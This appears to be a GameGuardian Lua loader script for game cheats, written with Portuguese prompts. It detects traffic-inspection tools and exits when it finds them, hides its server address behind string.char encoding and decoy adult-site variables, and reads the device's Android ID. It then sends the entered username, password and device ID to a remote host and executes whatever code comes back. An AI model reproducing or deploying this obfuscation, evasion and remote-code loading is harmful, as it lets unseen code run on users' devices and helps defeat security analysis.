ffvpn = "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F"
x = _ENV["tostring"](gg["makeRequest"](ffvpn))
if not x or not x:sub(1, 20) then
_ENV["gg"]["alert"]("Hi", "GO")
else
while 100 > #x or x:find("SSL") or x:find("I/O") or x:find("javax") do
_ENV["gg"]["alert"]("ᴏғғ ʜᴛᴛᴘ ᴄᴀɴᴀʀʏ")
_ENV["print"]("VPN DETECTADA")
_ENV["os"]["exit"]()
_ENV["gg"]["processKill"]()
Detectid()
end
end

S1 = PornHub.com
S2 = xvideos.com
S3 = xnxx.com
S4 = Brazzers.com
print (S4)
os.exit()
S5 = GotPorn.com
S6 = RedTube.com
S7 = GayTube.com
S8 = YouPorn.com
S9 = NudesGay.com
 
Script = string['char'](83,99,114,105,112,116,32,61,32,83,49,46,46,83,50,46,46,83,51,46,46,83,52,46,46,83,53,46,46,83,54,46,46,83,55,46,46,83,56,46,46,83,57)
pcall(load(Script))
 
function string:getUID()
 local class = luajava.bindClass
 local activity = nil
 xpcall(function()
 
  activity = class("android.ext.Tools"):getContext()
 end, function()
  -- GameGuardian v101.1
  activity = class("android.ext.Tools"):e()
 end)
 local Secure = class("android.provider.Settings$Secure")
 local UID = Secure:getString(activity:getContentResolver(), Secure.ANDROID_ID)
 return UID --  Default ID (unchanged)
end
 
 
 
uid = string:getUID()
 
function UID2()
G=string.getUID()
path= "/sdcard/config.txt"
cm=file.readFile(path) if cm == false then
io.open(path,"w"):write(G)
end new=file.readFile(path) ts =file.lastTime(path) uid = string.getHash(new..ts)
end
 
 
if
uid == nil then UID2()
end
 
Variable = {}
 
local configFile = gg.getFile()..'.cfg'
local data = loadfile(configFile)
 
Prompt1 = {nil, nil, nil, false, false}
 
if data ~= nil then
	Prompt1 = data()
end
 
Prompt2 = {"text","text","checkbox","checkbox","checkbox"}
 
Prompt = gg.prompt({"👤 USUARIO 👤","🔑 SENHA 🔑","📱 ID 📱","💾 SALVAR LOGIN 💾","🗑️ DELETAR LOGIN 🗑️","❌ SAIR ❌"},Prompt1,Prompt2)
 
if not Prompt then
return
end
 
if Prompt[3] then
 
alert = gg.alert(uid,"copiar","printar")
 
if alert == 1 then gg.CopyText(uid) os.exit() end
 
if alert == 2 then print(uid) os.exit() end
 
end
 
if Prompt[6] then
os.exit()
end
 
if Prompt[5] then
os.remove(configFile)
os.exit()
end
 
if Prompt[4] then
gg.saveVariable(Prompt, configFile)
end
 
Variable["TempLogin"]  = '{"Username":"'..Prompt[1]..'","Password":"'..Prompt[2]..'","Uid":"'..uid..'"}'
 
ResponseContent = gg.makeRequest(Script,nil,Variable["TempLogin"]).content
if not ResponseContent or ResponseContent == nil then os.exit() end
pcall(load(ResponseContent))
